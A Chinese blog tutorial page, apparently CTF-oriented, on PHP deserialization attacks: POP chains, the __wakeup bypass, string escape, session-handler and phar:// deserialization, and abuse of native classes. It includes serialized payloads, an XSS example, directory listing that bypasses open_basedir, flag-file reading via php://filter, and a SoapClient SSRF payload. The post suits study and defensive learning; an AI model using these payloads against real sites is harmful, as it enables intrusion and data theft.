<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>php反序列化 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">php反序列化</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">九月 27, 2022&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/php/">php</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>将对象转为字节流存储到硬盘上，当JVM停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间（永久性保存对象）<br>序列化成字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输。<br> <span id="more"></span></p>
<h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h3><p>序列化后的内容只有成员变量，没有成员函数</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;eeee&quot;</span>:<span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">2</span>:</span><br><span class="line">	&#123;</span><br><span class="line">		s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			s:<span class="number">8</span>:<span class="string">&quot;%00Sec%00obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;</span><br><span class="line">			s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;  N;                           <span class="comment">//r:1</span></span><br><span class="line">		&#125;</span><br><span class="line">		s:<span class="number">7</span>:<span class="string">&quot;%00*%00func&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			s:<span class="number">8</span>:<span class="string">&quot;%00Sec%00obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;</span><br><span class="line">			s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;N;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected：属性被序列化的时候属性名会变成%<span class="number">00</span>*%<span class="number">00</span>属性名，长度跟随属性名长度而改变</span><br><span class="line">private：  属性被序列化的时候属性名会变成%<span class="number">00</span>类名%<span class="number">00</span>属性名，长度跟随属性名长度而改变</span><br><span class="line">a - array               b - boolean</span><br><span class="line"></span><br><span class="line">d - double              i - integer</span><br><span class="line"></span><br><span class="line">o - common object       r - reference</span><br><span class="line"></span><br><span class="line">s - string              C - custom object</span><br><span class="line"></span><br><span class="line">O - class               N - <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">R - pointer reference   U - unicode string</span><br><span class="line">PHP 只对对象在序列化时才会生成对象引用标示(r),如果明确使用了 &amp; 符号作的引用，在序列化时，会被序列化为指针引用标示（R）。</span><br><span class="line">对象引用（r）和指针引用（R）的格式为：</span><br><span class="line"></span><br><span class="line">r :&lt; number &gt;;</span><br><span class="line">R :&lt; number &gt;;</span><br><span class="line">number 为序列化对象位置</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>例如·</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$int</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$intt</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>) </span>&#123; <span class="keyword">$this</span>-&gt;intt = <span class="variable">$name</span>; &#125; <span class="comment">//在 PHP 中，private 属性只能在类内部访问</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$classc</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$bool</span> ;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$obj</span> ;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$pr</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ClassA () ;</span><br><span class="line"><span class="variable">$a</span> -&gt; classc = <span class="keyword">new</span> ClassA (<span class="string">&#x27;12&#x27;</span>) ;</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">int</span> = <span class="number">1</span> ;</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="string">&quot; Hello &quot;</span> ;</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">bool</span> = <span class="literal">false</span> ;</span><br><span class="line"><span class="variable">$a</span> -&gt; pr =  <span class="variable">$a</span> -&gt; <span class="keyword">bool</span> ;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize ( <span class="variable">$a</span> )) ;</span><br></pre></td></tr></table></figure>
<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><p>在反序列化后,会进行变量覆盖(就算原本的类里没有声明这个变量也可以覆盖).不会触发类方法，但会触发魔术方法,同时魔术方法可以被继承，继承的魔术方法反序列化会被调用</p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>1.首先需要触发反序列化<br>魔术方法的对象为类，pop链一般由__destruct()和__wakeup()触发(即反序列化的结束)，如果在__destruct和__wakeup()中<br>2.(以不恰当的方法处理对象)，而<br>3.(对象中恰有相对应的魔术方法)，就会触发该方法，不断触发魔术方法后，最终在最后一个魔术方法中触发危险函数以达到目的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__construct                                         当一个对象创建时被调用，</span><br><span class="line"></span><br><span class="line">__destruct                                          当一个对象销毁时被调用，</span><br><span class="line"></span><br><span class="line">__sleep()                                           使用serialize时触发</span><br><span class="line"></span><br><span class="line">__wakeup()                                          使用unserialize时触发</span><br><span class="line"></span><br><span class="line">__toString                                          当一个对象被当作一个字符串被调用。</span><br><span class="line"></span><br><span class="line">__invoke()                                          当脚本尝试将对象调用为函数时触发本特性(只在 PHP 5.3.0 及以上版本有效。)</span><br><span class="line"></span><br><span class="line">__isset($var)                                       在不可访问的属性上调用isset()或empty()触发( isset () 函数用于检测变量是否已设置并且非 NULL,empty () 函数用于检查一个变量是否为空)</span><br><span class="line"></span><br><span class="line">__unset($var)                                       在不可访问的属性上使用unset()时触发(unset() — 释放给定的变量)</span><br><span class="line"></span><br><span class="line">__get($var)                                         用于从不可访问的属性读取数据，或者说是调用一个类及其父类方法中未定义属性时</span><br><span class="line"></span><br><span class="line">__set($val,$value)                                  用于将数据写入不可访问的属性，或者修改一个不能被修改的属性时(private protected)</span><br><span class="line"></span><br><span class="line">__call($function_name,$arguments)                   在对象上下文中调用不可访问的方法时触发，或者是不可访问方法时被调用,第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数</span><br><span class="line"></span><br><span class="line">__callStatic()                                      在静态上下文中调用不可访问的方法时触发,如thinlphp5.1中Request::param</span><br><span class="line"></span><br><span class="line">__clone()                                           当对象复制完成时调用(通过clone关键字克隆了一个对象的时候)</span><br></pre></td></tr></table></figure>
<h5 id="construct-和-destruct"><a href="#construct-和-destruct" class="headerlink" title="__construct()和__destruct()"></a>__construct()和__destruct()</h5><p>__construct：当对象创建时会自动调用，也就是说有new的时候就会调用，在unserialize时是不会被自动调用的，此方法常用在构造反序列化的pop链上</p>
<p>__destruct()：当对象被销毁时会自动调用；</p>
<h5 id="sleep-和-wakeup"><a href="#sleep-和-wakeup" class="headerlink" title="__sleep()和__wakeup()"></a>__sleep()和__wakeup()</h5><p>__sleep() ：在对象被序列化之前被调用，就是说看到serialize时就会被调用，而且是先调用后再执行序列化</p>
<p>__wakeup(): 将在字符串被反序列化之后被立即调用，就是说看到unserialize后就会被立即调用(优先等级比__destruct()高)</p>
<h4 id="wakeup-魔法函数绕过-PHP反序列化漏洞CVE-2016-7124"><a href="#wakeup-魔法函数绕过-PHP反序列化漏洞CVE-2016-7124" class="headerlink" title="wakeup()魔法函数绕过(PHP反序列化漏洞CVE-2016-7124)"></a>wakeup()魔法函数绕过(PHP反序列化漏洞CVE-2016-7124)</h4><p>适用php版本<br>PHP5.0.0&lt;5.6.25<br>PHP7.0.0&lt;7.0.10</p>
<p>当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行</p>
<h3 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h3><p><code>$str=&#39;O:6:&quot;people&quot;:2:&#123;s:5:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;&#125;&#39;;</code><br>在php序列化后，形成的字符串的大小和元素的数量是被限定的,且受格式的限制，贸然处理该字符串使字符串的某个‘值’大小变化，会导致字符串无法被反序列化<br>输入恰好的字符串长度，使其处理后还符合php序列化格式，让无用的部分字符逃逸或吞掉，从而达到我们想要的目的。</p>
<p>序列化后的字符串在进行反序列化操作时，会以{}两个花括号进行分界线，花括号以外的内容<strong>不会影响</strong>反序列化。</p>
<h4 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h4><p>处理前<br>a:2:{s:7:”flagphp”;s:48:”;s:1:”a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;<br>s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}<br>处理后<br>a:2:{s:7:””;s:48:”;s:1:”a”;<br>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;<br>s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
<h4 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h4><p>处理前<br>O:1:”A”:2:{s:4:”name”;s:52:”aaaaaaaaaaaaaaaaaaaaaaaaaa”;s:6:”passwd”;s:3:”123”;}”;s:6:”passwd”;s:3:”321”;}<br>处理后<br>O:1:”A”:2:{s:4:”name”;s:52:”bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb”;s:6:”passwd”;s:3:”123”;}”;s:6:”passwd”;s:3:”321”;}</p>
<h3 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h3><p>在 PHP 中启动会话，session_start — <strong>启动新会话</strong>或者<strong>重用现有会话</strong><br><code> session_start(array $options = array()): bool</code><br>session.save_path：这个是session的存储路径，也就是sess_session_id文件存储的路径<br>session.auto_start：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off<br>session.save_handler：这个是设置用户自定义session存储的选项，默认是files，也就是以文件的形式来存储的</p>
<ol>
<li>启动新会话<br>在默认files的情况下，如果没要session或者COOKIE中的PHPSESSID没有对应的文件，则会新生成一个session_id，存入COOKIE中的PHPSESSID中，并生成一个名为“sess_”+“session_id”的文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。<br>若session.use_strict_mode值为0(默认值)。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。</li>
<li>重用现有会话<br>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。<h4 id="session序列化存储的格式"><a href="#session序列化存储的格式" class="headerlink" title="session序列化存储的格式"></a>session序列化存储的格式</h4>session.serialize_handler，用来定义session序列化存储所用的处理器的名称，不同的处理器序列化以及读取出来会产生不同的结果；默认的处理器为php</li>
<li>处理器php<br>它处理之后的格式是键名+竖线|+经过serialize()序列化处理后的值<br><code>wllm|s:4:&quot;yyds&quot;;LTLT|s:5:&quot;ddwhm&quot;;</code></li>
<li>处理器php_binary<br>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理后的值；<br><code> WLLMS:4:&quot;&quot;yyds; LTLTS:5:&quot;ddwhm&quot;</code></li>
<li>处理器php_serialize(php&gt;5.5.4)<br>直接进行序列化，把session中的键和值都会被进行序列化操作,且放在一个数组中<br><code>a:2:&#123;s:4:&quot;wllm&quot;:s:4:&quot;yyds&quot;;s:4:&quot;LTLT&quot;;s:5:&quot;dddwh&quot;&#125;</code><h4 id="Session反序列化原理"><a href="#Session反序列化原理" class="headerlink" title="Session反序列化原理"></a>Session反序列化原理</h4>在重用现有会话，处理器php会以遇到的第一个“|”为分界线，前为键，后为值，将值反序列化，简单粗暴；</li>
</ol>
<p>在我们传入的序列化内容前加一个分隔符|,利用不同处理器序列化的差异，序列化我们想要的结果</p>
<h4 id="Session反序列化的利用"><a href="#Session反序列化的利用" class="headerlink" title="Session反序列化的利用"></a>Session反序列化的利用</h4><h3 id="phar反序列化-5-3-lt-php-lt-7-4默认开启支持"><a href="#phar反序列化-5-3-lt-php-lt-7-4默认开启支持" class="headerlink" title="phar反序列化(5.3&lt;=php&lt;=7.4默认开启支持)"></a>phar反序列化(5.3&lt;=php&lt;=7.4默认开启支持)</h3><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。</p>
<p>phar://伪协议会把<strong>任何文件</strong>当作phar文件处理，并不经解压直接访问phar文件下的文件(如果phar中只有一个文件，则默认读取该文件,不受phar文件名后内容的影响)<br>a:1:{s:4:“name”;s:199:”|O:10:”SoapClient”:3:{s:3:”uri”;s:25:”<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;%7D&quot;%7D">http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;}&quot;}</a><br>phar文件是由四部分组成的：</p>
<p>1.stub：可以理解为是phar文件的标志，就像GIF89a是图片头一样，它的格式为：xxxxx<?php xxx; __HALT_COMPILER();?>，前面内容没有限制，什么都行，只是结尾必须是__HALT_COMPILER();?&gt;，否则将不能被识别为phar文件</p>
<p><strong>2</strong>.manifest describing the contents：这里存放着压缩文件的信息，每个被压缩文件的权限，属性等信息都放在这里，这里还会以序列化的形式存储着用户<strong>自定义</strong>的meta-data，当php的文件操作函数通过phar://伪协议解析phar文件时会先自动先将meta-data进行反序列化</p>
<p>3.the file contents：被压缩文件的内容，这个随便是啥都不影响</p>
<p>4.signature for verifying Phar integrity：签名，放在文件末尾</p>
<p>其实这四条只有前面两条比较重要，后两条都是来打酱油的，总结下来就是两点：一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容是没有限制的，也就是说我们可以构造一个图片文件或者pdf文件来绕过上传的限制，将这个phar文件上传上去；二是phar文件存储meta-data时会先将内容序列化后再存入进去，当文件操作函数通过phar://伪协议解析phar文件时就会先将数据反序列化，这样就可以构成反序列化攻击，而文件操作函数有很多，下面就讲它</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;ArseneTang&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成一个phar文件，名字为phar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering(); </span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>); <span class="comment">//将创建的对象a写入到Metadata中</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//添加要进行压缩的文件，文件名为test，文件内容为testaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();<span class="comment">//写入结束之后记得stopBuffering停止缓冲</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;</span></span><br><span class="line"><span class="comment">b              ,   O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;ArseneTang&quot;;&#125;   test.txt   ÇE@c   D²ˆ¶      testaaaG4j|qeV|‹î7´ôXà\</span></span><br><span class="line"><span class="comment">œ   GBMB</span></span><br></pre></td></tr></table></figure>

<p>在有反序列化漏洞的文件下，利用<strong>文件操作函数</strong>(函数利用范围更广)以<strong>phar://伪协议</strong>访问我们上传的phar下的文件，就会使我们设置在该文件上的Metadata在<strong>系统文件下</strong>反序列化</p>
<h3 id="php原生类的利用"><a href="#php原生类的利用" class="headerlink" title="php原生类的利用"></a>php原生类的利用</h3><p>PHP原生类就是在标准PHP库中已经封装好的类，而这里面有一些类可以实现目录遍历，文件读取，发起请求等</p>
<p>但其中只有一小部分是我们可以利用的，一般比较常见的如下：</p>
<h4 id="Error实现XSS-php7"><a href="#Error实现XSS-php7" class="headerlink" title="Error实现XSS(php7)"></a>Error实现XSS(php7)</h4><p>类的构造方法接受两个可选参数 —— 一个消息字符串和一个错误码(用于分配不同的类)<br>同时这个类中还有一个内置方法**__toString()**的魔术方法,它会将Error以字符串的形式输出到页面上<br>格式为<code>Error: &lt;script&gt;alert(1)&lt;/script&gt; in D:\phpstudy_pro\WWW\2.php:13 Stack trace: #0 &#123;main&#125;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20221103093611.png" alt="QQ截图20221103093611"></p>
<h4 id="Exception内置类"><a href="#Exception内置类" class="headerlink" title="Exception内置类"></a>Exception内置类</h4><p>适用于php5、7版本<br>开启报错的情况下<br>原理是类似的</p>
<ol start="3">
<li>文件类</li>
</ol>
<ul>
<li>遍历目录<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dirname</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dirname</span>;<span class="comment">//DirectoryIterator类的__construct方法会构造一个迭代器，如果使用echo输出该迭代器，将触发__toString()而返回迭代器的第一项</span></span><br><span class="line">?a=<span class="built_in">DirectoryIterator</span>&amp;b=glob:\/\/f*   <span class="comment">//可以使用glob协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//FilesystemIterator类可以代替，使用方法和DirectoryIterator类差不多</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;/*.txt&quot;</span>);  <span class="comment">//自带glob</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"><span class="comment">//这三种遍历目录的方法可以无视open_basedir对目录的限制</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>读取文件<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/f1agaaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;<span class="comment">//每次只能读取文件中的一行内容</span></span><br></pre></td></tr></table></figure>
一行完整读取<br><code>?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</code></li>
</ul>
<h4 id="利用SoapClient实现SSRF"><a href="#利用SoapClient实现SSRF" class="headerlink" title="利用SoapClient实现SSRF"></a>利用SoapClient实现SSRF</h4><p>WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。<br>SOAP，作为webService三要素(SOAP、WSDL、UDDI)之一<br>UDDI  (Universal Description Discovery and Integration)通用描述发现和集成<br>WSDL  (WebService Description Language)  WebService描述语言<br>SOAP  (Simple Object Access Protocol) 简单对象访问协议<br>可基于HTTP协议，采用XML格式，用来传递信息的格式。</p>
